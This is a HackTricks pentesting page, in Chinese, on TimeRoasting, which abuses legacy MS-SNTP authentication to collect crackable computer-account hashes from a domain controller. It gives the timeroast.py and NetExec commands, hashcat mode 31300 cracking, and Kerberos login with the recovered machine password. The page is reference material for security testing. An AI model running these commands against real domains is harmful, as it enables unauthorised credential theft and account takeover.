# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting 利用旧版 MS-SNTP authentication。未经过 authentication 的 client 可以发送包含指定 computer-account RID 的 68-byte request。在可被利用的旧版路径中，domain controller 通过 Netlogon 使用 computer account 的 NT hash（由 MD4 派生的 password secret）计算 response authenticator，从而为攻击者提供适合离线 password guessing 的 challenge/MAC pair（Hashcat mode 31300）。<sup>[[1]](#references)[[2]](#references)</sup>

MS-SNTP 的第 3.1.5.1 和第 4 节描述了 request 和 response 的行为：<sup>[[1]](#references)</sup>
![TimeRoasting：详情请参阅官方 MS-SNTP spec 的第 3.1.5.1 节“Authentication Request Behavior”和第 4 节“Protocol Examples”](../../images/Pasted%20image%2020250709114508.png)
当 `ExtendedAuthenticatorSupported` 为 false 时，request 会将 RID 存储在 authenticator 的 Key Identifier 的低 31 位中，并将 selector bit 存储在最高位。server 会验证 68-byte length，提取 RID，请求 Netlogon 计算 candidate checksums，根据最高位选择其中一个，将 response Key Identifier 置零，然后返回所选的 checksum。<sup>[[1]](#references)</sup>

crypto-checksum 基于 MD5（参见 3.2.5.1.1），可以离线 crack，从而实现 roasting attack。<sup>[[1]](#references)</sup>

## How to Attack

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort 编写的 Timeroasting scripts<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## 实际攻击（未认证），使用 NetExec + Hashcat

- NetExec 的 `timeroast` module 可以枚举 computer RID，在无需 authentication 的情况下收集 MS-SNTP MAC，并打印可直接用于 cracking 的 `$sntp-ms$` hashes：<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- 使用 Hashcat 的 31300 模式（MS-SNTP MAC）进行离线破解：<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- 恢复出的明文对应于计算机账户密码。在禁用 NTLM 时，使用 Kerberos（-k）将其直接作为机器账户尝试：
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### 操作说明
- 在使用通过 Kerberos 恢复的 credentials 之前，确保时间准确。优先使用维护中的 NTP client，例如 `chronyd`/`systemd-timesyncd`；此处保留 `ntpdate` 作为常见的 lab 命令：`sudo ntpdate <dc_fqdn>`。
- 如有需要，为 AD realm 生成 krb5.conf：`netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- 在获得任何已认证 foothold 后，可以通过 LDAP/BloodHound 将 RIDs 映射到 principals。

## References

- [1] [MS-SNTP：Microsoft 简单网络时间协议](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting 白皮书](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — `timeroast` 模块源代码](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
